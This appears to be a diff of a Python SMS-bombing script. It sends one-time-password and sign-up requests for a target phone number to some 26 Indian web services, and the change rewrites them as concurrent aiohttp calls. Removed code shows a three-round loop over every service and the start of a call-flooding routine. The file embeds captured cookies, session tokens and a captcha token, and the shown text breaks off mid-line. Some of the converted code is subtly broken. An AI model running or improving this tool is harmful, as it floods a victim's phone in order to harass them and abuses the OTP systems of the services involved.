@@ -1,24 +1,32 @@
+import time
+import asyncio
+import aiohttp
 import requests
+start= time.time()
+
 def indsms(tarnum: int):
-    def whitehat(tarnum: int):
+    
+    
+    async def whitehat(tarnum: int ):
         try:
+            
             headers = {
-                'authority': 'api.whitehatjr.com',
-                'accept': 'application/json, text/plain, */*',
-                'accept-language': 'en-US,en;q=0.9',
-                'content-type': 'application/json;charset=UTF-8',
-                'origin': 'https://code.whitehatjr.com',
-                'referer': 'https://code.whitehatjr.com/',
-                'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'sec-fetch-dest': 'empty',
-                'sec-fetch-mode': 'cors',
-                'sec-fetch-site': 'same-site',
-                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
-                'whjr-amplitude-sessionid': '1688803790709',
-                'whjr-segment-anonymousid': 'ce603231-2d29-46c1-82d4-70b1a0a20494',
-            }
+            'authority': 'api.whitehatjr.com',
+            'accept': 'application/json, text/plain, */*',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/json;charset=UTF-8',
+            'origin': 'https://code.whitehatjr.com',
+            'referer': 'https://code.whitehatjr.com/',
+            'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
+            'whjr-amplitude-sessionid': '1688803790709',
+            'whjr-segment-anonymousid': 'ce603231-2d29-46c1-82d4-70b1a0a20494',
+                }
 
             params = {
                 'deviceId': 'b2477942-81e6-47ba-921d-7d2673862942',
@@ -29,22 +37,22 @@ def indsms(tarnum: int):
                 'brandId': 'whitehatjr',
                 'timestamp': '1688803828654',
                 '_vercel_no_cache': '1',
-            }
+                    }
 
             json_data = {
                 'dialCode': '+91',
                 'mobile': f'{tarnum}',
                 'g-recaptcha-response': '03AAYGu2RQ3WrKIPmFVc_CZyy2gqAgKAc5h3YubYhzlr_VXjKpWjnIlEZ2ij1SZ68Hx6JOP1waWARsDHRJ0PVUpYJUAhmEZXgcRLQMY57DQkzDgez8PQ8P2Ia4Vc47q-AMqVUS2eWLwzuNos8JBUUP0RFC87m3d2ROeViR6IsseygK5ft-w5q-WtUkqUvYywwHtCmApTTmdBMgVbsbTpnX5cRkRSriW3yqG7heX2S2TiPsF377BAL5UGUQmjP93CwUdn8Bf2hhXq60xP77LXoVEvAsOZKxUDmVbf5DqXkWU8w_cSS_ZiIpRjw2xKzRUAj_GZB0s03ZPrewTzbGc3JtY7BKd6TtqNmcQ6CiadK0relg-ccZsLjiIe85KSoFBZfSH9ZeL3PECO3d4GLwHQjxwUNpeF_DB0rFMmT2nWSoyh0RnBGQpF5JkZfzEHuRDEN7jOS1xS_TpmidLkBZP18UWGZNN_tBl0_8nwFpe08uFQ6cqxyvM92sCEyZCoY13a4ZamoRSPBBam3ZK5KPmX_sUhROXrNql_PK6lJd_xA1JAJij7yKP-wYQWKFanKM8dUeldLxyAMg2RhQ',
-            }
-
-            response = requests.post('https://api.whitehatjr.com/api/V1/otp/generate', params=params, headers=headers,
-                                     json=json_data)
-            print(response.text)
-            return "success"
+                    }
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://api.whitehatjr.com/api/V1/otp/generate', params=params, headers=headers, json=json_data) as response:
+                    print(response.text)
+             
+            return "done"
         except Exception as e:
             return "failed"
-
-    def unacademy(tarnum: int):
+    
+    async def unacademy(tarnum: int ):
         try:
             cookies = {
                 'ajs_anonymous_id': 'b6e6a772_f030_4210_94c7_dd283a1a3687',
@@ -72,10 +80,11 @@ def indsms(tarnum: int):
                 'ln_or': 'eyIyNjAyOTU2IjoiZCJ9',
                 '_ga': 'GA1.2.387904297.1676749491',
                 '_gac_UA-69016858-2': '1.1688781211.Cj0KCQjw756lBhDMARIsAEI0Agnr-7MurMNjGP2M1XhuYyHPqLs6XG1NwOxovI4Unmg81muidGhgXc8aAkaHEALw_wcB',
-            }
+                    }
+
 
             headers = {
-                'authority': 'unacademy.com',
+                 'authority': 'unacademy.com',
                 'accept': '*/*',
                 'accept-language': 'en-US,en;q=0.9',
                 'content-type': 'application/json',
@@ -90,11 +99,11 @@ def indsms(tarnum: int):
                 'sec-fetch-site': 'same-origin',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
                 'x-platform': '0',
-            }
+                    }
 
             params = {
                 'enable-email': 'true',
-            }
+                    }
 
             json_data = {
                 'phone': f'{tarnum}',
@@ -103,21 +112,20 @@ def indsms(tarnum: int):
                 'email': '',
                 'send_otp': True,
                 'is_un_teach_user': False,
-            }
-
-            response = requests.post(
+                    }
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post(
                 'https://unacademy.com/api/v3/user/user_check/',
                 params=params,
                 cookies=cookies,
                 headers=headers,
                 json=json_data,
-            )
-            print(response.text)
+                    ) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def apollo247(tarnum: int):
+    async def apollo247(tarnum: int ):
         try:
             headers = {
                 'authority': 'api.apollo247.com',
@@ -147,14 +155,14 @@ def indsms(tarnum: int):
                 },
                 'query': 'query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\n    status\n    message\n    loginId\n    __typename\n  }\n}\n',
             }
-
-            response = requests.post('https://api.apollo247.com/', headers=headers, json=json_data)
-            print(response.text)
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://api.apollo247.com/', headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
-            return "failed"
+            return "failed"  
 
-    def mg1(tarnum: int):
+    async def mg1(tarnum: int ):
         try:
             cookies = {
                 'VISITOR-ID': 'c99c0c9d-83d5-4278-c213-643112598a91_acce55_1676729979',
@@ -228,16 +236,16 @@ def indsms(tarnum: int):
                 'is_corporate_user': False,
                 'is_doctor': False,
             }
+            async with aiohttp.ClientSession() as sess:
 
-            response = requests.post('https://www.1mg.com/auth_api/v6/create_token', cookies=cookies, headers=headers,
-                                     json=json_data)
+                async with sess.post('https://www.1mg.com/auth_api/v6/create_token', cookies=cookies, headers=headers, json=json_data) as response:
 
-            print(response.text)
+                    print(response.text)
             return "done"
         except Exception as e:
-            return "failed"
+            return "failed" 
 
-    def textbook(tarnum: int):
+    async def textbook(tarnum: int ):
         try:
             headers = {
                 'authority': 'api.testbook.com',
@@ -258,19 +266,19 @@ def indsms(tarnum: int):
             }
 
             json_data = {}
+            async with aiohttp.ClientSession() as sess:
 
-            response = requests.post(
+                async with sess.post(
                 f'https://api.testbook.com/api/v2/otp/send?emailOrMobile={tarnum}&resend=true',
                 headers=headers,
                 json=json_data,
-            )
-
-            print(response.text)
+            ) as response:
+            
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def tendercut(tarnum: int):
+    async def tendercut(tarnum: int ):
         try:
             headers = {
                 'authority': 'api.tendercuts.in',
@@ -292,14 +300,14 @@ def indsms(tarnum: int):
                 'mobile': f'{tarnum}',
                 'otp_mode': 'SIGNUP',
             }
+            async with aiohttp.ClientSession() as sess:
 
-            response = requests.post('https://api.tendercuts.in/otp/v2/generate/', headers=headers, json=json_data)
-            print(response.text)
+                async with sess.post('https://api.tendercuts.in/otp/v2/generate/', headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def croma(tarnum: int):
+    async def croma(tarnum: int ):
         try:
             cookies = {
                 'SESSION': 'NjBhZjZjYTAtMjc1YS00M2YwLTliOTUtODVmNGRkZDQyODhl',
@@ -328,15 +336,14 @@ def indsms(tarnum: int):
                 'sendOtp': True,
                 'phone': f'{tarnum}',
             }
-
-            response = requests.post('https://api.tatadigital.com/api/v2/sso/check-phone', cookies=cookies,
-                                     headers=headers, json=json_data)
-            print(response.text)
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://api.tatadigital.com/api/v2/sso/check-phone', cookies=cookies, headers=headers, json=json_data) as response:
+                    print(response.text) 
             return "done"
         except Exception as e:
             return "failed"
-
-    def skecher(tarnum: int):
+        
+    async def skecher(tarnum: int ):
         try:
             cookies = {
                 'sid': '3-fBtiLG6qAgnCn2dbfa16Jc_jgPTnXDfW0',
@@ -382,20 +389,21 @@ def indsms(tarnum: int):
             }
 
             data = f'dwfrm_profile_customer_phone={tarnum}&phoneLogin=true'.encode()
+            async with aiohttp.ClientSession() as sess:
 
-            response = requests.post(
+                async with sess.post(
                 'https://www.skechers.in/on/demandware.store/Sites-skechersin-Site/default/Account-GenerateOTP',
                 params=params,
                 cookies=cookies,
                 headers=headers,
                 data=data,
-            )
-            print(response.text)
+            ) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def dentalcart(tarnum: int):
+    
+    async def dentalcart(tarnum: int ):
         try:
             headers = {
                 'authority': 'api-apollo.dentalkart.com',
@@ -425,14 +433,13 @@ def indsms(tarnum: int):
                 },
                 'query': 'mutation createAccountOTP($mobileNumber: String, $websiteId: Int) {\n  createAccountOTP(mobileNumber: $mobileNumber, websiteId: $websiteId) {\n    status\n    message\n    __typename\n  }\n}\n',
             }
-
-            response = requests.post('https://api-apollo.dentalkart.com/graphql', headers=headers, json=json_data)
-            print(response.text)
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://api-apollo.dentalkart.com/graphql', headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def lybra(tarnum: int):
+    async def lybra(tarnum: int ):
         try:
             cookies = {
                 'suid': '32d9eae9-15a8-416c-a213-ecd85c73aac2',
@@ -476,15 +483,13 @@ def indsms(tarnum: int):
                 'password': '17094525',
                 'email': 'jnjfdd@gmail.com',
             }
-
-            response = requests.post('https://www.lybrate.com/p/login-signup', cookies=cookies, headers=headers,
-                                     json=json_data)
-            print(response.text)
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://www.lybrate.com/p/login-signup', cookies=cookies, headers=headers, json=json_data)as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def decathon(tarnum: int):
+    async def decathon(tarnum: int ):
         try:
             cookies = {
                 'location': 'location',
@@ -540,15 +545,14 @@ def indsms(tarnum: int):
                 'param': f'{tarnum}',
                 'source': 1,
             }
-
-            response = requests.post('https://www.decathlon.in/api/login/sendotp', cookies=cookies, headers=headers,
-                                     json=json_data)
-            print(response.text)
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://www.decathlon.in/api/login/sendotp', cookies=cookies, headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def trainman(tarnum: int):
+    
+    async def trainman(tarnum: int ):
         try:
             cookies = {
                 '_fbp': 'fb.1.1678101239525.1621469544',
@@ -582,15 +586,14 @@ def indsms(tarnum: int):
             }
 
             data = f'------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{tarnum}\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="email"\r\n\r\n\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU\r\nContent-Disposition: form-data; name="name"\r\n\r\n\r\n------WebKitFormBoundarym9QS2xBGu82M0ZOU--\r\n'.encode()
-
-            response = requests.post('https://www.trainman.in/services/user/signup', params=params, cookies=cookies,
-                                     headers=headers, data=data)
-            print(response.text)
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://www.trainman.in/services/user/signup', params=params, cookies=cookies, headers=headers, data=data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def redbus(tarnum: int):
+        
+    async def redbus(tarnum: int ):
         try:
             cookies = {
                 'country': 'IND',
@@ -644,15 +647,15 @@ def indsms(tarnum: int):
                 'mobileNo': f'{tarnum}',
                 'phoneCode': '91',
             }
+            async with aiohttp.ClientSession() as sess:
 
-            response = requests.post('https://www.redbus.in/help/api/cx/generateOtp', cookies=cookies, headers=headers,
-                                     json=json_data)
-            print(response.text)
+                async with sess.post('https://www.redbus.in/help/api/cx/generateOtp', cookies=cookies, headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
 
-    def confirm(tarnum: int):
+    async def confirm(tarnum: int ):
         try:
             headers = {
                 'Accept': '*/*',
@@ -668,17 +671,18 @@ def indsms(tarnum: int):
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Windows"',
             }
+            async with aiohttp.ClientSession() as sess:
 
-            response = requests.get(
+                async with sess.get(
                 f'https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={tarnum}&newOtp=true&retry=false&testparamsp=true',
                 headers=headers,
-            )
-            print(response.text)
+                ) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def physics(tarnum: int):
+        
+    async def physics(tarnum: int ):
         try:
             headers = {
                 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
@@ -703,15 +707,14 @@ def indsms(tarnum: int):
                 'mobile': f'{tarnum}',
                 'organizationId': '5eb393ee95fab7468a79d189',
             }
-
-            response = requests.post('https://api.penpencil.co/v1/users/resend-otp', params=params, headers=headers,
-                                     json=json_data)
-            print(response.text)
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://api.penpencil.co/v1/users/resend-otp', params=params, headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def upgrade(tarnum: int):
+        
+    async def upgrade(tarnum: int ):
         try:
             headers = {
                 'authority': 'prod-auth-api.upgrad.com',
@@ -738,15 +741,15 @@ def indsms(tarnum: int):
             json_data = {
                 'phoneNumber': f'+91{tarnum}',
             }
+            async with aiohttp.ClientSession() as sess:
 
-            response = requests.post('https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone',
-                                     headers=headers, json=json_data)
-            print(response.text)
+                async with sess.post('https://prod-auth-api.upgrad.com/apis/auth/v5/registration/phone', headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def vedantu(tarnum: int):
+        
+    async def vedantu(tarnum: int ):
         try:
             cookies = {
                 'LAST_SOURCE_UTMS': '{"utm_campaign":null,"utm_source":"google","utm_medium":"organic","utm_term":null,"utm_content":null}',
@@ -787,15 +790,15 @@ def indsms(tarnum: int):
                 'version': 2,
                 'ver': '12.336',
             }
+            async with aiohttp.ClientSession() as sess:
 
-            response = requests.post('https://user.vedantu.com/user/preLoginVerification', cookies=cookies,
-                                     headers=headers, json=json_data)
-            print(response.text)
+                async with sess.post('https://user.vedantu.com/user/preLoginVerification', cookies=cookies, headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def doubtnut(tarnum: int):
+        
+    async def doubtnut(tarnum: int ):
         try:
             headers = {
                 'authority': 'api.doubtnut.com',
@@ -815,14 +818,14 @@ def indsms(tarnum: int):
             }
 
             data = f'phone_number={tarnum}&is_web=3'.encode()
-
-            response = requests.post('https://api.doubtnut.com/v4/student/login', headers=headers, data=data)
-            print(response.text)
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://api.doubtnut.com/v4/student/login', headers=headers, data=data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def zee5(tarnum: int):
+        
+    async def zee5(tarnum: int ):
         try:
             headers = {
                 'Accept': 'application/json',
@@ -845,14 +848,14 @@ def indsms(tarnum: int):
             json_data = {
                 'phoneno': f'91{tarnum}',
             }
-
-            response = requests.post('https://auth.zee5.com/v1/user/sendotp', headers=headers, json=json_data)
-            print(response.text)
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://auth.zee5.com/v1/user/sendotp', headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def ballebazi(tarnum: int):
+        
+    async def ballebazi(tarnum: int ):
         try:
             headers = {
                 'authority': 'bbapi.ballebaazi.com',
@@ -874,14 +877,13 @@ def indsms(tarnum: int):
             json_data = {
                 'phone': f'{tarnum}',
             }
-
-            response = requests.post('https://bbapi.ballebaazi.com/users/applink', headers=headers, json=json_data)
-            print(response.text)
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://bbapi.ballebaazi.com/users/applink', headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def byjus(tarnum: int):
+    async def byjus(tarnum: int ):
         try:
             headers = {
                 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
@@ -898,15 +900,15 @@ def indsms(tarnum: int):
                 'tel': f'+91{tarnum}',
                 'deviceType': 'web',
             }
+            async with aiohttp.ClientSession() as sess:
 
-            response = requests.post('https://webapi.byjusexamprep.com/user/verify/sendOtp', headers=headers,
-                                     json=json_data)
-            print(response.text)
+                async with sess.post('https://webapi.byjusexamprep.com/user/verify/sendOtp', headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def dunzo(tarnum: int):
+        
+    async def dunzo(tarnum: int ):
         try:
             cookies = {
                 'dz_e': 'YTAzOWIzNjMtNDU2MC00NDI1LWJjMjMtNDU5NTM4NTZkOGEwX3Yx',
@@ -948,15 +950,14 @@ def indsms(tarnum: int):
                 'phone': f'{tarnum}',
                 'tos_accepted': True,
             }
-
-            response = requests.post('https://www.dunzo.com/api/v0/auth/sign-up', cookies=cookies, headers=headers,
-                                     json=json_data)
-            print(response.text)
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://www.dunzo.com/api/v0/auth/sign-up', cookies=cookies, headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def rapido(tarnum: int):
+        
+    async def rapido(tarnum: int ):
         try:
             headers = {
                 'authority': 'customer.rapido.bike',
@@ -976,14 +977,14 @@ def indsms(tarnum: int):
             json_data = {
                 'mobile': f'{tarnum}',
             }
-
-            response = requests.post('https://customer.rapido.bike/api/otp', headers=headers, json=json_data)
-            print(response.text)
+            async with aiohttp.ClientSession() as sess:
+                async with sess.post('https://customer.rapido.bike/api/otp', headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def gopaysense(tarnum: int):
+    
+    async def gopaysense(tarnum: int ):
         try:
             headers = {
                 'authority': 'api.gopaysense.com',
@@ -1004,14 +1005,15 @@ def indsms(tarnum: int):
             json_data = {
                 'phone': f'{tarnum}',
             }
+            async with aiohttp.ClientSession() as sess:
 
-            response = requests.post('https://api.gopaysense.com/users/otp', headers=headers, json=json_data)
-            print(response.text)
+                async with sess.post('https://api.gopaysense.com/users/otp', headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def medibuddy(tarnum: int):
+        
+    async def medibuddy(tarnum: int ):
         try:
             cookies = {
                 '_ga': 'GA1.2.1885740090.1677007469',
@@ -1054,15 +1056,15 @@ def indsms(tarnum: int):
                 'advertiserId': '1052940192611150823',
                 'mbUserId': None,
             }
+            async with aiohttp.ClientSession() as sess:
 
-            response = requests.post('https://www.medibuddy.in/unified-login/user/register', cookies=cookies,
-                                     headers=headers, json=json_data)
-            print(response.text)
+                async with sess.post('https://www.medibuddy.in/unified-login/user/register', cookies=cookies, headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    def moglix(tarnum: int):
+        
+    async def moglix(tarnum: int ):
         try:
             headers = {
                 'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
@@ -1084,77 +1086,44 @@ def indsms(tarnum: int):
                 'source': 'signup',
                 'device': 'mobile',
             }
+            async with aiohttp.ClientSession() as sess:
 
-            response = requests.post('https://apinew.moglix.com/nodeApi/v1/login/sendOTP', headers=headers,
-                                     json=json_data)
-            print(response.text)
+                async with sess.get('https://apinew.moglix.com/nodeApi/v1/login/sendOTP', headers=headers, json=json_data) as response:
+                    print(response.text)
             return "done"
         except Exception as e:
             return "failed"
-
-    for i in range(3):
-        whitehat(tarnum)
-        moglix(tarnum)
-        medibuddy(tarnum)
-        gopaysense(tarnum)
-        rapido(tarnum)
-        dunzo(tarnum)
-        byjus(tarnum)
-        ballebazi(tarnum)
-        zee5(tarnum)
-        doubtnut(tarnum)
-        vedantu(tarnum)
-        upgrade(tarnum)
-        physics(tarnum)
-        confirm(tarnum)
-        redbus(tarnum)
-        trainman(tarnum)
-        decathon(tarnum)
-        lybra(tarnum)
-        dentalcart(tarnum)
-        skecher(tarnum)
-        croma(tarnum)
-        tendercut(tarnum)
-        textbook(tarnum)
-        mg1(tarnum)
-        apollo247(tarnum)
-        unacademy(tarnum)
-
-
-def indcall():
-    def hotstar():
+        
+    async def Xtracover(tarnum: int):
         try:
             cookies = {
-                'geo': 'IN,HR,GURGAON,28.47,77.03,38266',
-                'geo': 'IN,HR,GURGAON,28.47,77.03,38266',
-                'geo': 'IN,HR,GURGAON,28.47,77.03,38266',
-                'x_migration_exp': 'true',
-                'SELECTED__LANGUAGE': 'eng',
-                'deviceId': '464113-4abf4c-96c943-6ebb05',
-                'appLaunchCounter': '1',
-                '_gcl_au': '1.1.1858063035.1688890860',
-                'userUP': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTY4OTQ5NTg3MCwiaWF0IjoxNjg4ODkxMDcwLCJpc3MiOiJUUyIsImp0aSI6ImEzYjBmOTMwYmFiMjQ3ODA4OTRkNzU4NjY2MGQ1ZmU2Iiwic3ViIjoie1wiaElkXCI6XCJmN2FlNmFiMTI0NDI0NjcyOTMwMjA4ZDFlOThmNWJiNVwiLFwicElkXCI6XCI2N2ZlNDljNWU3MmM0NTVjYWVlNmQ2ZGJhOTc1YWMxYlwiLFwibmFtZVwiOlwiWW91XCIsXCJpcFwiOlwiNDIuMTExLjEzLjM4XCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcIjQ2NDExMy00YWJmNGMtOTZjOTQzLTZlYmIwNVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2ODg4OTEwNzA5OTAsXCJkcGlkXCI6XCI2N2ZlNDljNWU3MmM0NTVjYWVlNmQ2ZGJhOTc1YWMxYlwiLFwic3RcIjoxLFwiZGF0YVwiOlwiQ2dRSUFEb0FDZ3dJQUNJSWtBSDNzNExPa3pFS0JBZ0FFZ0FLQkFnQVFnQUtCQWdBTWdBS2VRZ0FLblVLQWdvQUNnUUtBZ2dDQ21rS0J3Z0JGUUFBQUVBU0Nnb0RhMkZ1SmZyNkV6d1NDZ29EZEdWc0pTbUYzRDBTQ2dvRFpXNW5KVkNYTkQwU0Nnb0RiV0Z5SlptZk5qMFNDZ29EYUdsdUpSSUFFajhTQ2dvRFltVnVKUVZhaHowU0Nnb0RiV0ZzSlpVTUZEMFNDZ29EZEdGdEpTai8rVDA9XCJ9IiwidmVyc2lvbiI6IjFfMCJ9.vxxwB24K3IA6woi5hlvUOnRuOoKzs8OUCvAyvBppWg8',
-                'userHID': 'f7ae6ab124424672930208d1e98f5bb5',
-                'userPID': '67fe49c5e72c455caee6d6dba975ac1b',
-                '_fbp': 'fb.1.1688890860738.1558577123',
-                '_ga': 'GA1.2.2145563385.1688890861',
-                '_gid': 'GA1.2.1953227971.1688890862',
-                '_gat_UA-53733575-1': '1',
-                '_uetsid': '8aeb46101e3111ee978e07406301b7ea',
-                '_uetvid': '8aeb4af01e3111eea07b1da37cac1674',
-                '_ga_QV5FD29XJC': 'GS1.1.1688890860.1.1.1688890865.55.0.0',
-                'AK_SERVER_TIME': '1688891088',
-                'userCountryCode': 'in',
+                '_gcl_au': '1.1.437252216.1686488607',
+                'XcCart': 'rntljjxihtxmt5gmwlx55d4p',
+                '_fbp': 'fb.1.1686488607618.1734074002',
+                '_hjSessionUser_2540939': 'eyJpZCI6ImY1ZWM4MzE0LTJhYzItNTMzZi1iNzk2LTMyOGM3YzAxNzc2ZiIsImNyZWF0ZWQiOjE2ODY0ODg2MDg0NDksImV4aXN0aW5nIjp0cnVlfQ==',
+                'ASP.NET_SessionId': 'lypcjzops3h0ealvoro3i3zs',
+                'tcl54JDWDWFWEFDFJ2142DSAFD': 'pdXWe0QVjAm3G0wRTUIvz3xzd0GP/KpNktWNcczoyD9/drOB5S7JumenV4dEO52gtv6V4sTngO8Gpmh7tb1Mgy+FqNZmWZp2GHDlF+2/Y7X15LZNA8HhirzH4prX4/xfZmdP/F4O7y3d7aOkpjh5OqRFYaO74ug6hI0ycRy+7lYou9nsmG0z9blBw8qdDF1IJNTWjp0Kzv60GUEsQYenQxv8lK/3mHOmG4N+ZbFTjiTd0r7xjwYZb1ClbCoMt2gOLT1PgCl2fx9umqmtLtVW+w==',
+                'tct54JDWDWFWEFDFJ2142DSAFD': 'pdXWe0QVjAm3G0wRTUIvz3xzd0GP/KpNktWNcczoyD82LpfEVMpy1b0VEqjnO/p9WvY2S2HcAS7VuNYBqtNEyGx3Q9uPgxvXeaWNjAKyj65YB32413jWTyVuONFSLx9v/0Yn9mk9oxmC73TiScIRzykLbfQu2QZ9xijcH2D5mil+HAj+JgJcXTNyRMMnbyW4L2xgoE5culelKW/M39JngUWuJ6qOSz35neDQlGALMh8=',
+                '_gid': 'GA1.2.555995201.1688926130',
+                '_gat_gtag_UA_175427683_1': '1',
+                '_clck': '10x2wrd|2|fd5|0|1257',
+                '_hjIncludedInSessionSample_2540939': '0',
+                '_hjSession_2540939': 'eyJpZCI6IjlmNzNjMTBmLWNkYWItNGRjYS04NTVkLTQ3OGU0OTczZDZkZiIsImNyZWF0ZWQiOjE2ODg5MjYxMzQ2NzgsImluU2FtcGxlIjpmYWxzZX0=',
+                '_hjAbsoluteSessionInProgress': '0',
+                '_ga_PVWZVW9QBM': 'GS1.1.1688926130.2.1.1688926141.49.0.0',
+                '_ga': 'GA1.1.1981712338.1686488607',
+                '_ga_4RW6VRZC6Z': 'GS1.1.1688926130.1.1.1688926141.49.0.0',
+                '_clsk': '1xy9yxu|1688926142905|2|1|y.clarity.ms/collect',
             }
 
             headers = {
-                'authority': 'www.hotstar.com',
-                'accept': 'application/json, text/plain, */*',
-                'accept-language': 'eng',
-                'content-type': 'application/json',
-                # 'cookie': 'geo=IN,HR,GURGAON,28.47,77.03,38266; geo=IN,HR,GURGAON,28.47,77.03,38266; geo=IN,HR,GURGAON,28.47,77.03,38266; x_migration_exp=true; SELECTED__LANGUAGE=eng; deviceId=464113-4abf4c-96c943-6ebb05; appLaunchCounter=1; _gcl_au=1.1.1858063035.1688890860; 